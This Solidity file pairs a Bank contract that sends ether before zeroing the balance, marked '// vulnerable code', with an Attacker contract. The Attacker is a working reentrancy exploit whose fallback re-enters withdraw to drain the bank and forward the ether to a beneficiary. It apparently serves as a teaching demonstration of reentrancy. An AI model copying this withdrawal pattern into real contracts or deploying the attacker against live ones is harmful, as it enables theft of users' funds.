// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Bank {
  event Deposit(address indexed sender, uint256 amount);
  event Withdraw(address indexed sender, uint256 amount);

  mapping(address => uint256) private _balances;

  receive() external payable {}

  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  function deposit() external payable {
    _balances[msg.sender] += msg.value;
    emit Deposit(msg.sender, msg.value);
  }

  function withdraw() external {
    uint256 balance = _balances[msg.sender];
    require(balance > 0, "Bank: no balance");
    // vulnerable code
    (bool success,) = msg.sender.call{value : balance}("");
    require(success, "Bank: transfer ether failed");
    _balances[msg.sender] = 0;
    emit Withdraw(msg.sender, balance);
  }
}

contract Attacker {

  Bank private bank;
  address private immutable beneficiary;

  constructor(address bank_, address beneficiary_) {
    require(bank_ != address(0), "Attacker: bank is zero address");
    require(beneficiary_ != address(0), "Attacker: beneficiary is zero address");
    bank = Bank(payable(bank_));
    beneficiary = beneficiary_;
  }

  fallback() external payable {
    if (address(bank).balance >= 1 ether) {
      bank.withdraw();
    }
  }

  function attack() external payable {
    require(msg.value >= 1 ether, "msg.value should be greater than 1 ether");
    bank.deposit{value : 1 ether}();
    bank.withdraw();
  }

  function withdraw() external {
    (bool success,) = beneficiary.call{value : address(this).balance}("");
    require(success, "Attacker: withdraw failed");
  }
}